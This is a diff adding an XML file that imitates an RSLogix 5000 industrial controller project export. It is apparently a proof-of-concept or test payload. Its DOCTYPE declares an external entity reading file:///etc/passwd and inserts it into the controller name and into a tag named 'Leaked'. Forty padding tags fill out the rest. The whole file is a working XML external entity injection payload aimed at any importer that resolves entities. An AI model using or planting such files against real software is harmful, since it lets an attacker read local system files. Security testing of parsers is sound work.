@@ -1,0 +1,51 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE RSLogix5000Content [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<RSLogix5000Content SchemaRevision="1.0">
+    <Controller Name="XXE_&xxe;_Controller" ProcessorType="1756-L83E">
+        <Tags>
+            <Tag Name="Pad000" DataType="DINT"><Data Format="Decorated"><DataValue DataType="DINT" Radix="Decimal" Value="0"/></Data></Tag>
+            <Tag Name="Pad001" DataType="DINT"><Data Format="Decorated"><DataValue DataType="DINT" Radix="Decimal" Value="1"/></Data></Tag>
+            <Tag Name="Pad002" DataType="DINT"><Data Format="Decorated"><DataValue DataType="DINT" Radix="Decimal" Value="2"/></Data></Tag>
+            <Tag Name="Pad003" DataType="DINT"><Data Format="Decorated"><DataValue DataType="DINT" Radix="Decimal" Value="3"/></Data></Tag>
+            <Tag Name="Pad004" DataType="DINT"><Data Format="Decorated"><DataValue DataType="DINT" Radix="Decimal" Value="4"/></Data></Tag>
+            <Tag Name="Pad005" DataType="DINT"><Data Format="Decorated"><DataValue DataType="DINT" Radix="Decimal" Value="5"/></Data></Tag>
+            <Tag Name="Pad006" DataType="DINT"><Data Format="Decorated"><DataValue DataType="DINT" Radix="Decimal" Value="6"/></Data></Tag>
+            <Tag Name="Pad007" DataType="DINT"><Data Format="Decorated"><DataValue DataType="DINT" Radix="Decimal" Value="7"/></Data></Tag>
+            <Tag Name="Pad008" DataType="DINT"><Data Format="Decorated"><DataValue DataType="DINT" Radix="Decimal" Value="8"/></Data></Tag>
+            <Tag Name="Pad009" DataType="DINT"><Data Format="Decorated"><DataValue DataType="DINT" Radix="Decimal" Value="9"/></Data></Tag>
+            <Tag Name="Pad010" DataType="DINT"><Data Format="Decorated"><DataValue DataType="DINT" Radix="Decimal" Value="10"/></Data></Tag>
+            <Tag Name="Pad011" DataType="DINT"><Data Format="Decorated"><DataValue DataType="DINT" Radix="Decimal" Value="11"/></Data></Tag>
+            <Tag Name="Pad012" DataType="DINT"><Data Format="Decorated"><DataValue DataType="DINT" Radix="Decimal" Value="12"/></Data></Tag>
+            <Tag Name="Pad013" DataType="DINT"><Data Format="Decorated"><DataValue DataType="DINT" Radix="Decimal" Value="13"/></Data></Tag>
+            <Tag Name="Pad014" DataType="DINT"><Data Format="Decorated"><DataValue DataType="DINT" Radix="Decimal" Value="14"/></Data></Tag>
+            <Tag Name="Pad015" DataType="DINT"><Data Format="Decorated"><DataValue DataType="DINT" Radix="Decimal" Value="15"/></Data></Tag>
+            <Tag Name="Pad016" DataType="DINT"><Data Format="Decorated"><DataValue DataType="DINT" Radix="Decimal" Value="16"/></Data></Tag>
+            <Tag Name="Pad017" DataType="DINT"><Data Format="Decorated"><DataValue DataType="DINT" Radix="Decimal" Value="17"/></Data></Tag>
+            <Tag Name="Pad018" DataType="DINT"><Data Format="Decorated"><DataValue DataType="DINT" Radix="Decimal" Value="18"/></Data></Tag>
+            <Tag Name="Pad019" DataType="DINT"><Data Format="Decorated"><DataValue DataType="DINT" Radix="Decimal" Value="19"/></Data></Tag>
+            <Tag Name="Pad020" DataType="DINT"><Data Format="Decorated"><DataValue DataType="DINT" Radix="Decimal" Value="20"/></Data></Tag>
+            <Tag Name="Pad021" DataType="DINT"><Data Format="Decorated"><DataValue DataType="DINT" Radix="Decimal" Value="21"/></Data></Tag>
+            <Tag Name="Pad022" DataType="DINT"><Data Format="Decorated"><DataValue DataType="DINT" Radix="Decimal" Value="22"/></Data></Tag>
+            <Tag Name="Pad023" DataType="DINT"><Data Format="Decorated"><DataValue DataType="DINT" Radix="Decimal" Value="23"/></Data></Tag>
+            <Tag Name="Pad024" DataType="DINT"><Data Format="Decorated"><DataValue DataType="DINT" Radix="Decimal" Value="24"/></Data></Tag>
+            <Tag Name="Pad025" DataType="DINT"><Data Format="Decorated"><DataValue DataType="DINT" Radix="Decimal" Value="25"/></Data></Tag>
+            <Tag Name="Pad026" DataType="DINT"><Data Format="Decorated"><DataValue DataType="DINT" Radix="Decimal" Value="26"/></Data></Tag>
+            <Tag Name="Pad027" DataType="DINT"><Data Format="Decorated"><DataValue DataType="DINT" Radix="Decimal" Value="27"/></Data></Tag>
+            <Tag Name="Pad028" DataType="DINT"><Data Format="Decorated"><DataValue DataType="DINT" Radix="Decimal" Value="28"/></Data></Tag>
+            <Tag Name="Pad029" DataType="DINT"><Data Format="Decorated"><DataValue DataType="DINT" Radix="Decimal" Value="29"/></Data></Tag>
+            <Tag Name="Pad030" DataType="DINT"><Data Format="Decorated"><DataValue DataType="DINT" Radix="Decimal" Value="30"/></Data></Tag>
+            <Tag Name="Pad031" DataType="DINT"><Data Format="Decorated"><DataValue DataType="DINT" Radix="Decimal" Value="31"/></Data></Tag>
+            <Tag Name="Pad032" DataType="DINT"><Data Format="Decorated"><DataValue DataType="DINT" Radix="Decimal" Value="32"/></Data></Tag>
+            <Tag Name="Pad033" DataType="DINT"><Data Format="Decorated"><DataValue DataType="DINT" Radix="Decimal" Value="33"/></Data></Tag>
+            <Tag Name="Pad034" DataType="DINT"><Data Format="Decorated"><DataValue DataType="DINT" Radix="Decimal" Value="34"/></Data></Tag>
+            <Tag Name="Pad035" DataType="DINT"><Data Format="Decorated"><DataValue DataType="DINT" Radix="Decimal" Value="35"/></Data></Tag>
+            <Tag Name="Pad036" DataType="DINT"><Data Format="Decorated"><DataValue DataType="DINT" Radix="Decimal" Value="36"/></Data></Tag>
+            <Tag Name="Pad037" DataType="DINT"><Data Format="Decorated"><DataValue DataType="DINT" Radix="Decimal" Value="37"/></Data></Tag>
+            <Tag Name="Pad038" DataType="DINT"><Data Format="Decorated"><DataValue DataType="DINT" Radix="Decimal" Value="38"/></Data></Tag>
+            <Tag Name="Pad039" DataType="DINT"><Data Format="Decorated"><DataValue DataType="DINT" Radix="Decimal" Value="39"/></Data></Tag>
+            <Tag Name="Leaked" DataType="STRING"><Data Format="Decorated"><DataValue DataType="STRING" Value="&xxe;"/></Data></Tag>
+        </Tags>
+    </Controller>
+</RSLogix5000Content>
